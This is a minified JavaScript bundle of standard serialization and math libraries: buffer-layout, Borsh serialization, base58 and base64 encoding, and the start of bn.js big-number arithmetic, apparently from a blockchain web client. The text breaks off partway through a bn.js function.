/*! For license information please see bundle.js.LICENSE.txt */
(()=>{var t={601:(t,e,r)=>{"use strict";e.I0=e.DH=e.NX=e.u8=e.cY=void 0,e.av=e.O6=e.w3=e.Wg=void 0;const n=r(287);function i(t){if(!(t instanceof Uint8Array))throw new TypeError("b must be a Uint8Array")}function o(t){return i(t),n.Buffer.from(t.buffer,t.byteOffset,t.length)}class s{constructor(t,e){if(!Number.isInteger(t))throw new TypeError("span must be an integer");this.span=t,this.property=e}makeDestinationObject(){return{}}getSpan(t,e){if(0>this.span)throw new RangeError("indeterminate span");return this.span}replicate(t){const e=Object.create(this.constructor.prototype);return Object.assign(e,this),e.property=t,e}fromArray(t){}}function a(t,e){return e.property?t+"["+e.property+"]":t}class c extends s{isCount(){throw new Error("ExternalLayout is abstract")}}class u extends c{constructor(t,e=0,r){if(!(t instanceof s))throw new TypeError("layout must be a Layout");if(!Number.isInteger(e))throw new TypeError("offset must be integer or undefined");super(t.span,r||t.property),this.layout=t,this.offset=e}isCount(){return this.layout instanceof h||this.layout instanceof l}decode(t,e=0){return this.layout.decode(t,e+this.offset)}encode(t,e,r=0){return this.layout.encode(t,e,r+this.offset)}}class h extends s{constructor(t,e){if(super(t,e),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(t,e=0){return o(t).readUIntLE(e,this.span)}encode(t,e,r=0){return o(e).writeUIntLE(t,r,this.span),this.span}}class l extends s{constructor(t,e){if(super(t,e),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(t,e=0){return o(t).readUIntBE(e,this.span)}encode(t,e,r=0){return o(e).writeUIntBE(t,r,this.span),this.span}}const f=Math.pow(2,32);function d(t){const e=Math.floor(t/f);return{hi32:e,lo32:t-e*f}}function p(t,e){return t*f+e}class g extends s{constructor(t){super(8,t)}decode(t,e=0){const r=o(t),n=r.readUInt32LE(e);return p(r.readUInt32LE(e+4),n)}encode(t,e,r=0){const n=d(t),i=o(e);return i.writeUInt32LE(n.lo32,r),i.writeUInt32LE(n.hi32,r+4),8}}class m extends s{constructor(t){super(8,t)}decode(t,e=0){const r=o(t),n=r.readUInt32LE(e);return p(r.readInt32LE(e+4),n)}encode(t,e,r=0){const n=d(t),i=o(e);return i.writeUInt32LE(n.lo32,r),i.writeInt32LE(n.hi32,r+4),8}}class y extends s{constructor(t,e,r){if(!(t instanceof s))throw new TypeError("elementLayout must be a Layout");if(!(e instanceof c&&e.isCount()||Number.isInteger(e)&&0<=e))throw new TypeError("count must be non-negative integer or an unsigned integer ExternalLayout");let n=-1;!(e instanceof c)&&0<t.span&&(n=e*t.span),super(n,r),this.elementLayout=t,this.count=e}getSpan(t,e=0){if(0<=this.span)return this.span;let r=0,n=this.count;if(n instanceof c&&(n=n.decode(t,e)),0<this.elementLayout.span)r=n*this.elementLayout.span;else{let i=0;for(;i<n;)r+=this.elementLayout.getSpan(t,e+r),++i}return r}decode(t,e=0){const r=[];let n=0,i=this.count;for(i instanceof c&&(i=i.decode(t,e));n<i;)r.push(this.elementLayout.decode(t,e)),e+=this.elementLayout.getSpan(t,e),n+=1;return r}encode(t,e,r=0){const n=this.elementLayout,i=t.reduce(((t,i)=>t+n.encode(i,e,r+t)),0);return this.count instanceof c&&this.count.encode(t.length,e,r),i}}class w extends s{constructor(t,e,r){if(!Array.isArray(t)||!t.reduce(((t,e)=>t&&e instanceof s),!0))throw new TypeError("fields must be array of Layout instances");"boolean"==typeof e&&void 0===r&&(r=e,e=void 0);for(const e of t)if(0>e.span&&void 0===e.property)throw new Error("fields cannot contain unnamed variable-length layout");let n=-1;try{n=t.reduce(((t,e)=>t+e.getSpan()),0)}catch(t){}super(n,e),this.fields=t,this.decodePrefixes=!!r}getSpan(t,e=0){if(0<=this.span)return this.span;let r=0;try{r=this.fields.reduce(((r,n)=>{const i=n.getSpan(t,e);return e+=i,r+i}),0)}catch(t){throw new RangeError("indeterminate span")}return r}decode(t,e=0){i(t);const r=this.makeDestinationObject();for(const n of this.fields)if(void 0!==n.property&&(r[n.property]=n.decode(t,e)),e+=n.getSpan(t,e),this.decodePrefixes&&t.length===e)break;return r}encode(t,e,r=0){const n=r;let i=0,o=0;for(const n of this.fields){let s=n.span;if(o=0<s?s:0,void 0!==n.property){const i=t[n.property];void 0!==i&&(o=n.encode(i,e,r),0>s&&(s=n.getSpan(e,r)))}i=r,r+=s}return i+o-n}fromArray(t){const e=this.makeDestinationObject();for(const r of this.fields)void 0!==r.property&&0<t.length&&(e[r.property]=t.shift());return e}layoutFor(t){if("string"!=typeof t)throw new TypeError("property must be string");for(const e of this.fields)if(e.property===t)return e}offsetOf(t){if("string"!=typeof t)throw new TypeError("property must be string");let e=0;for(const r of this.fields){if(r.property===t)return e;0>r.span?e=-1:0<=e&&(e+=r.span)}}}class b extends s{constructor(t,e){if(!(t instanceof c&&t.isCount()||Number.isInteger(t)&&0<=t))throw new TypeError("length must be positive integer or an unsigned integer ExternalLayout");let r=-1;t instanceof c||(r=t),super(r,e),this.length=t}getSpan(t,e){let r=this.span;return 0>r&&(r=this.length.decode(t,e)),r}decode(t,e=0){let r=this.span;return 0>r&&(r=this.length.decode(t,e)),o(t).slice(e,e+r)}encode(t,e,r){let n=this.length;if(this.length instanceof c&&(n=t.length),!(t instanceof Uint8Array&&n===t.length))throw new TypeError(a("Blob.encode",this)+" requires (length "+n+") Uint8Array as src");if(r+n>e.length)throw new RangeError("encoding overruns Uint8Array");const i=o(t);return o(e).write(i.toString("hex"),r,n,"hex"),this.length instanceof c&&this.length.encode(n,e,r),n}}e.cY=(t,e,r)=>new u(t,e,r),e.u8=t=>new h(1,t),e.NX=t=>new h(2,t),e.DH=t=>new h(4,t),e.I0=t=>new g(t),e.Wg=t=>new m(t),e.w3=(t,e,r)=>new w(t,e,r),e.O6=(t,e,r)=>new y(t,e,r),e.av=(t,e)=>new b(t,e)},448:function(t,e,r){"use strict";var n=r(287).Buffer,i=this&&this.__createBinding||(Object.create?function(t,e,r,n){void 0===n&&(n=r),Object.defineProperty(t,n,{enumerable:!0,get:function(){return e[r]}})}:function(t,e,r,n){void 0===n&&(n=r),t[n]=e[r]}),o=this&&this.__setModuleDefault||(Object.create?function(t,e){Object.defineProperty(t,"default",{enumerable:!0,value:e})}:function(t,e){t.default=e}),s=this&&this.__decorate||function(t,e,r,n){var i,o=arguments.length,s=o<3?e:null===n?n=Object.getOwnPropertyDescriptor(e,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,r,s):i(e,r))||s);return o>3&&s&&Object.defineProperty(e,r,s),s},a=this&&this.__importStar||function(t){if(t&&t.__esModule)return t;var e={};if(null!=t)for(var r in t)"default"!==r&&Object.hasOwnProperty.call(t,r)&&i(e,t,r);return o(e,t),e},c=this&&this.__importDefault||function(t){return t&&t.__esModule?t:{default:t}};Object.defineProperty(e,"__esModule",{value:!0}),e.deserializeUnchecked=e.deserialize=e.serialize=e.BinaryReader=e.BinaryWriter=e.BorshError=e.baseDecode=e.baseEncode=void 0;const u=c(r(404)),h=c(r(763)),l=a(r(281)),f=new("function"!=typeof TextDecoder?l.TextDecoder:TextDecoder)("utf-8",{fatal:!0});e.baseEncode=function(t){return"string"==typeof t&&(t=n.from(t,"utf8")),h.default.encode(n.from(t))},e.baseDecode=function(t){return n.from(h.default.decode(t))};const d=1024;class p extends Error{constructor(t){super(t),this.fieldPath=[],this.originalMessage=t}addToFieldPath(t){this.fieldPath.splice(0,0,t),this.message=this.originalMessage+": "+this.fieldPath.join(".")}}e.BorshError=p;class g{constructor(){this.buf=n.alloc(d),this.length=0}maybeResize(){this.buf.length<16+this.length&&(this.buf=n.concat([this.buf,n.alloc(d)]))}writeU8(t){this.maybeResize(),this.buf.writeUInt8(t,this.length),this.length+=1}writeU16(t){this.maybeResize(),this.buf.writeUInt16LE(t,this.length),this.length+=2}writeU32(t){this.maybeResize(),this.buf.writeUInt32LE(t,this.length),this.length+=4}writeU64(t){this.maybeResize(),this.writeBuffer(n.from(new u.default(t).toArray("le",8)))}writeU128(t){this.maybeResize(),this.writeBuffer(n.from(new u.default(t).toArray("le",16)))}writeU256(t){this.maybeResize(),this.writeBuffer(n.from(new u.default(t).toArray("le",32)))}writeU512(t){this.maybeResize(),this.writeBuffer(n.from(new u.default(t).toArray("le",64)))}writeBuffer(t){this.buf=n.concat([n.from(this.buf.subarray(0,this.length)),t,n.alloc(d)]),this.length+=t.length}writeString(t){this.maybeResize();const e=n.from(t,"utf8");this.writeU32(e.length),this.writeBuffer(e)}writeFixedArray(t){this.writeBuffer(n.from(t))}writeArray(t,e){this.maybeResize(),this.writeU32(t.length);for(const r of t)this.maybeResize(),e(r)}toArray(){return this.buf.subarray(0,this.length)}}function m(t,e,r){const n=r.value;r.value=function(...t){try{return n.apply(this,t)}catch(t){if(t instanceof RangeError){const e=t.code;if(["ERR_BUFFER_OUT_OF_BOUNDS","ERR_OUT_OF_RANGE"].indexOf(e)>=0)throw new p("Reached the end of buffer when deserializing")}throw t}}}e.BinaryWriter=g;class y{constructor(t){this.buf=t,this.offset=0}readU8(){const t=this.buf.readUInt8(this.offset);return this.offset+=1,t}readU16(){const t=this.buf.readUInt16LE(this.offset);return this.offset+=2,t}readU32(){const t=this.buf.readUInt32LE(this.offset);return this.offset+=4,t}readU64(){const t=this.readBuffer(8);return new u.default(t,"le")}readU128(){const t=this.readBuffer(16);return new u.default(t,"le")}readU256(){const t=this.readBuffer(32);return new u.default(t,"le")}readU512(){const t=this.readBuffer(64);return new u.default(t,"le")}readBuffer(t){if(this.offset+t>this.buf.length)throw new p(`Expected buffer length ${t} isn't within bounds`);const e=this.buf.slice(this.offset,this.offset+t);return this.offset+=t,e}readString(){const t=this.readU32(),e=this.readBuffer(t);try{return f.decode(e)}catch(t){throw new p(`Error decoding UTF-8 string: ${t}`)}}readFixedArray(t){return new Uint8Array(this.readBuffer(t))}readArray(t){const e=this.readU32(),r=Array();for(let n=0;n<e;++n)r.push(t());return r}}function w(t){return t.charAt(0).toUpperCase()+t.slice(1)}function b(t,e,r,n,i){try{if("string"==typeof n)i[`write${w(n)}`](r);else if(n instanceof Array)if("number"==typeof n[0]){if(r.length!==n[0])throw new p(`Expecting byte array of length ${n[0]}, but got ${r.length} bytes`);i.writeFixedArray(r)}else if(2===n.length&&"number"==typeof n[1]){if(r.length!==n[1])throw new p(`Expecting byte array of length ${n[1]}, but got ${r.length} bytes`);for(let e=0;e<n[1];e++)b(t,null,r[e],n[0],i)}else i.writeArray(r,(r=>{b(t,e,r,n[0],i)}));else if(void 0!==n.kind)switch(n.kind){case"option":null==r?i.writeU8(0):(i.writeU8(1),b(t,e,r,n.type,i));break;case"map":i.writeU32(r.size),r.forEach(((r,o)=>{b(t,e,o,n.key,i),b(t,e,r,n.value,i)}));break;default:throw new p(`FieldType ${n} unrecognized`)}else v(t,r,i)}catch(t){throw t instanceof p&&t.addToFieldPath(e),t}}function v(t,e,r){if("function"==typeof e.borshSerialize)return void e.borshSerialize(r);const n=t.get(e.constructor);if(!n)throw new p(`Class ${e.constructor.name} is missing in schema`);if("struct"===n.kind)n.fields.map((([n,i])=>{b(t,n,e[n],i,r)}));else{if("enum"!==n.kind)throw new p(`Unexpected schema kind: ${n.kind} for ${e.constructor.name}`);{const i=e[n.field];for(let o=0;o<n.values.length;++o){const[s,a]=n.values[o];if(s===i){r.writeU8(o),b(t,s,e[s],a,r);break}}}}}function k(t,e,r,n){try{if("string"==typeof r)return n[`read${w(r)}`]();if(r instanceof Array){if("number"==typeof r[0])return n.readFixedArray(r[0]);if("number"==typeof r[1]){const e=[];for(let i=0;i<r[1];i++)e.push(k(t,null,r[0],n));return e}return n.readArray((()=>k(t,e,r[0],n)))}if("option"===r.kind)return n.readU8()?k(t,e,r.type,n):void 0;if("map"===r.kind){let i=new Map;const o=n.readU32();for(let s=0;s<o;s++){const o=k(t,e,r.key,n),s=k(t,e,r.value,n);i.set(o,s)}return i}return S(t,r,n)}catch(t){throw t instanceof p&&t.addToFieldPath(e),t}}function S(t,e,r){if("function"==typeof e.borshDeserialize)return e.borshDeserialize(r);const n=t.get(e);if(!n)throw new p(`Class ${e.name} is missing in schema`);if("struct"===n.kind){const n={};for(const[i,o]of t.get(e).fields)n[i]=k(t,i,o,r);return new e(n)}if("enum"===n.kind){const i=r.readU8();if(i>=n.values.length)throw new p(`Enum index: ${i} is out of range`);const[o,s]=n.values[i],a=k(t,o,s,r);return new e({[o]:a})}throw new p(`Unexpected schema kind: ${n.kind} for ${e.constructor.name}`)}s([m],y.prototype,"readU8",null),s([m],y.prototype,"readU16",null),s([m],y.prototype,"readU32",null),s([m],y.prototype,"readU64",null),s([m],y.prototype,"readU128",null),s([m],y.prototype,"readU256",null),s([m],y.prototype,"readU512",null),s([m],y.prototype,"readString",null),s([m],y.prototype,"readFixedArray",null),s([m],y.prototype,"readArray",null),e.BinaryReader=y,e.serialize=function(t,e,r=g){const n=new r;return v(t,e,n),n.toArray()},e.deserialize=function(t,e,r,n=y){const i=new n(r),o=S(t,e,i);if(i.offset<r.length)throw new p(`Unexpected ${r.length-i.offset} bytes after deserialized data`);return o},e.deserializeUnchecked=function(t,e,r,n=y){return S(t,e,new n(r))}},364:(t,e,r)=>{"use strict";var n=r(861).Buffer;t.exports=function(t){if(t.length>=255)throw new TypeError("Alphabet too long");for(var e=new Uint8Array(256),r=0;r<e.length;r++)e[r]=255;for(var i=0;i<t.length;i++){var o=t.charAt(i),s=o.charCodeAt(0);if(255!==e[s])throw new TypeError(o+" is ambiguous");e[s]=i}var a=t.length,c=t.charAt(0),u=Math.log(a)/Math.log(256),h=Math.log(256)/Math.log(a);function l(t){if("string"!=typeof t)throw new TypeError("Expected String");if(0===t.length)return n.alloc(0);for(var r=0,i=0,o=0;t[r]===c;)i++,r++;for(var s=(t.length-r)*u+1>>>0,h=new Uint8Array(s);r<t.length;){var l=e[t.charCodeAt(r)];if(255===l)return;for(var f=0,d=s-1;(0!==l||f<o)&&-1!==d;d--,f++)l+=a*h[d]>>>0,h[d]=l%256>>>0,l=l/256>>>0;if(0!==l)throw new Error("Non-zero carry");o=f,r++}for(var p=s-o;p!==s&&0===h[p];)p++;var g=n.allocUnsafe(i+(s-p));g.fill(0,0,i);for(var m=i;p!==s;)g[m++]=h[p++];return g}return{encode:function(e){if((Array.isArray(e)||e instanceof Uint8Array)&&(e=n.from(e)),!n.isBuffer(e))throw new TypeError("Expected Buffer");if(0===e.length)return"";for(var r=0,i=0,o=0,s=e.length;o!==s&&0===e[o];)o++,r++;for(var u=(s-o)*h+1>>>0,l=new Uint8Array(u);o!==s;){for(var f=e[o],d=0,p=u-1;(0!==f||d<i)&&-1!==p;p--,d++)f+=256*l[p]>>>0,l[p]=f%a>>>0,f=f/a>>>0;if(0!==f)throw new Error("Non-zero carry");i=d,o++}for(var g=u-i;g!==u&&0===l[g];)g++;for(var m=c.repeat(r);g<u;++g)m+=t.charAt(l[g]);return m},decodeUnsafe:l,decode:function(t){var e=l(t);if(e)return e;throw new Error("Non-base"+a+" character")}}}},526:(t,e)=>{"use strict";e.byteLength=function(t){var e=a(t),r=e[0],n=e[1];return 3*(r+n)/4-n},e.toByteArray=function(t){var e,r,o=a(t),s=o[0],c=o[1],u=new i(function(t,e,r){return 3*(e+r)/4-r}(0,s,c)),h=0,l=c>0?s-4:s;for(r=0;r<l;r+=4)e=n[t.charCodeAt(r)]<<18|n[t.charCodeAt(r+1)]<<12|n[t.charCodeAt(r+2)]<<6|n[t.charCodeAt(r+3)],u[h++]=e>>16&255,u[h++]=e>>8&255,u[h++]=255&e;return 2===c&&(e=n[t.charCodeAt(r)]<<2|n[t.charCodeAt(r+1)]>>4,u[h++]=255&e),1===c&&(e=n[t.charCodeAt(r)]<<10|n[t.charCodeAt(r+1)]<<4|n[t.charCodeAt(r+2)]>>2,u[h++]=e>>8&255,u[h++]=255&e),u},e.fromByteArray=function(t){for(var e,n=t.length,i=n%3,o=[],s=16383,a=0,u=n-i;a<u;a+=s)o.push(c(t,a,a+s>u?u:a+s));return 1===i?(e=t[n-1],o.push(r[e>>2]+r[e<<4&63]+"==")):2===i&&(e=(t[n-2]<<8)+t[n-1],o.push(r[e>>10]+r[e>>4&63]+r[e<<2&63]+"=")),o.join("")};for(var r=[],n=[],i="undefined"!=typeof Uint8Array?Uint8Array:Array,o="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",s=0;s<64;++s)r[s]=o[s],n[o.charCodeAt(s)]=s;function a(t){var e=t.length;if(e%4>0)throw new Error("Invalid string. Length must be a multiple of 4");var r=t.indexOf("=");return-1===r&&(r=e),[r,r===e?0:4-r%4]}function c(t,e,n){for(var i,o,s=[],a=e;a<n;a+=3)i=(t[a]<<16&16711680)+(t[a+1]<<8&65280)+(255&t[a+2]),s.push(r[(o=i)>>18&63]+r[o>>12&63]+r[o>>6&63]+r[63&o]);return s.join("")}n["-".charCodeAt(0)]=62,n["_".charCodeAt(0)]=63},184:(t,e,r)=>{"use strict";var n=r(287).Buffer;e.k5=function(t){{const e=n.from(t);e.reverse();const r=e.toString("hex");return 0===r.length?BigInt(0):BigInt(`0x${r}`)}},e.cI=function(t){{const e=t.toString("hex");return 0===e.length?BigInt(0):BigInt(`0x${e}`)}},e.Bq=function(t,e){{const r=t.toString(16),i=n.from(r.padStart(2*e,"0").slice(0,2*e),"hex");return i.reverse(),i}},e.zy=function(t,e){{const r=t.toString(16);return n.from(r.padStart(2*e,"0").slice(0,2*e),"hex")}}},404:function(t,e,r){!function(t,e){"use strict";function n(t,e){if(!t)throw new Error(e||"Assertion failed")}function i(t,e){t.super_=e;var r=function(){};r.prototype=e.prototype,t.prototype=new r,t.prototype.constructor=t}function o(t,e,r){if(o.isBN(t))return t;this.negative=0,this.words=null,this.length=0,this.red=null,null!==t&&("le"!==e&&"be"!==e||(r=e,e=10),this._init(t||0,e||10,r||"be"))}var s;"object"==typeof t?t.exports=o:e.BN=o,o.BN=o,o.wordSize=26;try{s="undefined"!=typeof window&&void 0!==window.Buffer?window.Buffer:r(790).Buffer}catch(t){}function a(t,e){var r=t.charCodeAt(e);return r>=48&&r<=57?r-48:r>=65&&r<=70?r-55:r>=97&&r<=102?r-87:void n(!1,"Invalid character in "+t)}function c(t,e,r){var n=a(t,r);return r-1>=e&&(n|=a(t,r-1)<<4),n}function u(t,e,r,i){for(var o=0,s=0,a=Math.min(t.length,r),c=e;c<a;c++){var u=t.charCodeAt(c)-48;o*=i,s=u>=49?u-49+10:u>=17?u-17+10:u,n(u>=0&&s<i,"Invalid character"),o+=s}return o}function h(t,e){t.words=e.words,t.length=e.length,t.negative=e.negative,t.red=e.red}if(o.isBN=function(t){return t instanceof o||null!==t&&"object"==typeof t&&t.constructor.wordSize===o.wordSize&&Array.isArray(t.words)},o.max=function(t,e){return t.cmp(e)>0?t:e},o.min=function(t,e){return t.cmp(e)<0?t:e},o.prototype._init=function(t,e,r){if("number"==typeof t)return this._initNumber(t,e,r);if("object"==typeof t)return this._initArray(t,e,r);"hex"===e&&(e=16),n(e===(0|e)&&e>=2&&e<=36);var i=0;"-"===(t=t.toString().replace(/\s+/g,""))[0]&&(i++,this.negative=1),i<t.length&&(16===e?this._parseHex(t,i,r):(this._parseBase(t,e,i),"le"===r&&this._initArray(this.toArray(),e,r)))},o.prototype._initNumber=function(t,e,r){t<0&&(this.negative=1,t=-t),t<67108864?(this.words=[67108863&t],this.length=1):t<4503599627370496?(this.words=[67108863&t,t/67108864&67108863],this.length=2):(n(t<9007199254740992),this.words=[67108863&t,t/67108864&67108863,1],this.length=3),"le"===r&&this._initArray(this.toArray(),e,r)},o.prototype._initArray=function(t,e,r){if(n("number"==typeof t.length),t.length<=0)return this.words=[0],this.length=1,this;this.length=Math.ceil(t.length/3),this.words=new Array(this.length);for(var i=0;i<this.length;i++)this.words[i]=0;var o,s,a=0;if("be"===r)for(i=t.length-1,o=0;i>=0;i-=3)s=t[i]|t[i-1]<<8|t[i-2]<<16,this.words[o]|=s<<a&67108863,this.words[o+1]=s>>>26-a&67108863,(a+=24)>=26&&(a-=26,o++);else if("le"===r)for(i=0,o=0;i<t.length;i+=3)s=t[i]|t[i+1]<<8|t[i+2]<<16,this.words[o]|=s<<a&67108863,this.words[o+1]=s>>>26-a&67108863,(a+=24)>=26&&(a-=26,o++);return this._strip()},o.prototype._parseHex=function(t,e,r){this.length=Math.ceil((t.length-e)/6),this.words=new Array(this.length);for(var n=0;n<this.length;n++)this.words[n]=0;var i,o=0,s=0;if("be"===r)for(n=t.length-1;n>=e;n-=2)i=c(t,e,n)<<o,this.words[s]|=67108863&i,o>=18?(o-=18,s+=1,this.words[s]|=i>>>26):o+=8;else for(n=(t.length-e)%2==0?e+1:e;n<t.length;n+=2)i=c(t,e,n)<<o,this.words[s]|=67108863&i,o>=18?(o-=18,s+=1,this.words[s]|=i>>>26):o+=8;this._strip()},o.prototype._parseBase=function(t,e,r){this.words=[0],this.length=1;for(var n=0,i=1;i<=67108863;i*=e)n++;n--,i=i/e|0;for(var o=t.length-r,s=o%n,a=Math.min(o,o-s)+r,c=0,h=r;h<a;h+=n)c=u(t,h,h+n,e),this.imuln(i),this.words[0]+c<67108864?this.words[0]+=c:this._iaddn(c);if(0!==s){var l=1;for(c=u(t,h,t.length,e),h=0;h<s;h++)l*=e;this.imuln(l),this.words[0]+c<67108864?this.words[0]+=c:this._iaddn(c)}this._strip()},o.prototype.copy=function(t){t.words=new Array(this.length);for(var e=0;e<this.length;e++)t.words[e]=this.words[e];t.length=this.length,t.negative=this.negative,t.red=this.red},o.prototype._move=function(t){h(t,this)},o.prototype.clone=function(){var t=new o(null);return this.copy(t),t},o.prototype._expand=function(t){for(;this.length<t;)this.words[this.length++]=0;return this},o.prototype._strip=function(){for(;this.length>1&&0===this.words[this.length-1];)this.length--;return this._normSign()},o.prototype._normSign=function(){return 1===this.length&&0===this.words[0]&&(this.negative=0),this},"undefined"!=typeof Symbol&&"function"==typeof Symbol.for)try{o.prototype[Symbol.for("nodejs.util.inspect.custom")]=l}catch(t){o.prototype.inspect=l}else o.prototype.inspect=l;function l(){return(this.red?"<BN-R: ":"<BN: ")+this.toString(16)+">"}var f=["","0","00","000","0000","00000","000000","0000000","00000000","000000000","0000000000","00000000000","000000000000","0000000000000","00000000000000","000000000000000","0000000000000000","00000000000000000","000000000000000000","0000000000000000000","00000000000000000000","000000000000000000000","0000000000000000000000","00000000000000000000000","000000000000000000000000","0000000000000000000000000"],d=[0,0,25,16,12,11,10,9,8,8,7,7,7,7,6,6,6,6,6,6,6,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5],p=[0,0,33554432,43046721,16777216,48828125,60466176,40353607,16777216,43046721,1e7,19487171,35831808,62748517,7529536,11390625,16777216,24137569,34012224,47045881,64e6,4084101,5153632,6436343,7962624,9765625,11881376,14348907,17210368,20511149,243e5,28629151,33554432,39135393,45435424,52521875,60466176];function g(t,e,r){r.negative=e.negative^t.negative;var n=t.length+e.length|0;r.length=n,n=n-1|0;var i=0|t.words[0],o=0|e.words[0],s=i*o,a=67108863&s,c=s/67108864|0;r.words[0]=a;for(var u=1;u<n;u++){for(var h=c>>>26,l=67108863&c,f=Math.min(u,e.length-1),d=Math.max(0,u-t.length+1);d<=f;d++){var p=u-d|0;h+=(s=(i=0|t.words[p])*(o=0|e.words[d])+l)/67108864|0,l=67108863&s}r.words[u]=0|l,c=0|h}return 0!==c?r.words[u]=0|c:r.length--,r._strip()}o.prototype.toString=function(t,e){var r;if(e=0|e||1,16===(t=t||10)||"hex"===t){r="";for(var i=0,o=0,s=0;s<this.length;s++){var a=this.words[s],c=(16777215&(a<<i|o)).toString(16);o=a>>>24-i&16777215,(i+=2)>=26&&(i-=26,s--),r=0!==o||s!==this.length-1?f[6-c.length]+c+r:c+r}for(0!==o&&(r=o.toString(16)+r);r.length%e!=0;)r="0"+r;return 0!==this.negative&&(r="-"+r),r}if(t===(0|t)&&t>=2&&t<=36){var u=d[t],h=p[t];r="";var l=this.clone();for(l.negative=0;!l.isZero();){var g=l.modrn(h).toString(t);r=(l=l.idivn(h)).isZero()?g+r:f[u-g.length]+g+r}for(this.isZero()&&(r="0"+r);r.length%e!=0;)r="0"+r;return 0!==this.negative&&(r="-"+r),r}n(!1,"Base should be between 2 and 36")},o.prototype.toNumber=function(){var t=this.words[0];return 2===this.length?t+=67108864*this.words[1]:3===this.length&&1===this.words[2]?t+=4503599627370496+67108864*this.words[1]:this.length>2&&n(!1,"Number can only safely store up to 53 bits"),0!==this.negative?-t:t},o.prototype.toJSON=function(){return this.toString(16,2)},s&&(o.prototype.toBuffer=function(t,e){return this.toArrayLike(s,t,e)}),o.prototype.toArray=function(t,e){return this.toArrayLike(Array,t,e)},o.prototype.toArrayLike=function(t,e,r){this._strip();var i=this.byteLength(),o=r||Math.max(1,i);n(i<=o,"byte array longer than desired length"),n(o>0,"Requested array length <= 0");var s=function(t,e){return t.allocUnsafe?t.allocUnsafe(e):new t(e)}(t,o);return this["_toArrayLike"+("le"===e?"LE":"BE")](s,i),s},o.prototype._toArrayLikeLE=function(t,e){for(var r=0,n=0,i=0,o=0;i<this.length;i++){var s=this.words[i]<<o|n;t[r++]=255&s,r<t.length&&(t[r++]=s>>8&255),r<t.length&&(t[r++]=s>>16&255),6===o?(r<t.length&&(t[r++]=s>>24&255),n=0,o=0):(n=s>>>24,o+=2)}if(r<t.length)for(t[r++]=n;r<t.length;)t[r++]=0},o.prototype._toArrayLikeBE=function(t,e){for(var r=t.length-1,n=0,i=0,o=0;i<this.length;i++){var s=this.words[i]<<o|n;t[r--]=255&s,r>=0&&(t[r--]=s>>8&255),r>=0&&(t[r--]=s>>16&255),6===o?(r>=0&&(t[r--]=s>>24&255),n=0,o=0):(n=s>>>24,o+=2)}if(r>=0)for(t[r--]=n;r>=0;)t[r--]=0},Math.clz32?o.prototype._countBits=function(t){return 32-Math.clz32(t)}:o.prototype._countBits=function(t){var e=t,r=0;return e>=4096&&(r+=13,e>>>=13),e>=64&&(r+=7,e>>>=7),e>=8&&(r+=4,e>>>=4),e>=2&&(r+=2,e>>>=2),r+e},o.prototype._zeroBits=function(t){if(0===t)return 26;var e=t,r=0;return 8191&e||(r+=13,e>>>=13),127&e||(r+=7,e>>>=7),15&e||(r+=4,e>>>=4),3&e||(r+=2,e>>>=2),1&e||r++,r},o.prototype.bitLength=function(){var t=this.words[this.length-1],e=this._countBits(t);return 26*(this.length-1)+e},o.prototype.zeroBits=function(){if(this.isZero())return 0;for(var t=0,e=0;e<this.length;e++){var r=this._zeroBits(this.words[e]);if(t+=r,26!==r)break}return t},o.prototype.byteLength=function(){return Math.ceil(this.bitLength()/8)},o.prototype.toTwos=function(t){return 0!==this.negative?this.abs().inotn(t).iaddn(1):this.clone()},o.prototype.fromTwos=function(t){return this.testn(t-1)?this.notn(t).iaddn(1).ineg():this.clone()},o.prototype.isNeg=function(){return 0!==this.negative},o.prototype.neg=function(){return this.clone().ineg()},o.prototype.ineg=function(){return this.isZero()||(this.negative^=1),this},o.prototype.iuor=function(t){for(;this.length<t.length;)this.words[this.length++]=0;for(var e=0;e<t.length;e++)this.words[e]=this.words[e]|t.words[e];return this._strip()},o.prototype.ior=function(t){return n(!(this.negative|t.negative)),this.iuor(t)},o.prototype.or=function(t){return this.length>t.length?this.clone().ior(t):t.clone().ior(this)},o.prototype.uor=function(t){return this.length>t.length?this.clone().iuor(t):t.clone().iuor(this)},o.prototype.iuand=function(t){var e;e=this.length>t.length?t:this;for(var r=0;r<e.length;r++)this.words[r]=this.words[r]&t.words[r];return this.length=e.length,this._strip()},o.prototype.iand=function(t){return n(!(this.negative|t.negative)),this.iuand(t)},o.prototype.and=function(t){return this.length>t.length?this.clone().iand(t):t.clone().iand(this)},o.prototype.uand=function(t){return this.length>t.length?this.clone().iuand(t):t.clone().iuand(this)},o.prototype.iuxor=function(t){var e,r;this.length>t.length?(e=this,r=t):(e=t,r=this);for(var n=0;n<r.length;n++)this.words[n]=e.words[n]^r.words[n];if(this!==e)for(;n<e.length;n++)this.words[n]=e.words[n];return this.length=e.length,this._strip()},o.prototype.ixor=function(t){return n(!(this.negative|t.negative)),this.iuxor(t)},o.prototype.xor=function(t){return this.length>t.length?this.clone().ixor(t):t.clone().ixor(this)},o.prototype.uxor=function(t){return this.length>t.length?this.clone().iuxor(t):t.clone().iuxor(this)},o.prototype.inotn=function(t){n("number"==typeof t&&t>=0);var e=0|Math.ceil(t/26),r=t%26;this._expand(e),r>0&&e--;for(var i=0;i<e;i++)this.words[i]=67108863&~this.words[i];return r>0&&(this.words[i]=~this.words[i]&67108863>>26-r),this._strip()},o.prototype.notn=function(t){return this.clone().inotn(t)},o.prototype.setn=function(t,e){n("number"==typeof t&&t>=0);var r=t/26|0,i=t%26;return this._expand(r+1),this.words[r]=e?this.words[r]|1<<i:this.words[r]&~(1<<i),this._strip()},o.prototype.iadd=function(t){var e,r,n;if(0!==this.negative&&0===t.negative)return this.negative=0,e=this.isub(t),this.negative^=1,this._normSign();if(0===this.negative&&0!==t.negative)return t.negative=0,e=this.isub(t),t.negative=1,e._normSign();this.length>t.length?(r=this,n=t):(r=t,n=this);for(var i=0,o=0;o<n.length;o++)e=(0|r.words[o])+(0|n.words[o])+i,this.words[o]=67108863&e,i=e>>>26;for(;0!==i&&o<r.length;o++)e=(0|r.words[o])+i,this.words[o]=67108863&e,i=e>>>26;if(this.length=r.length,0!==i)this.words[this.length]=i,this.length++;else if(r!==this)for(;o<r.length;o++)this.words[o]=r.words[o];return this},o.prototype.add=function(t){var e;return 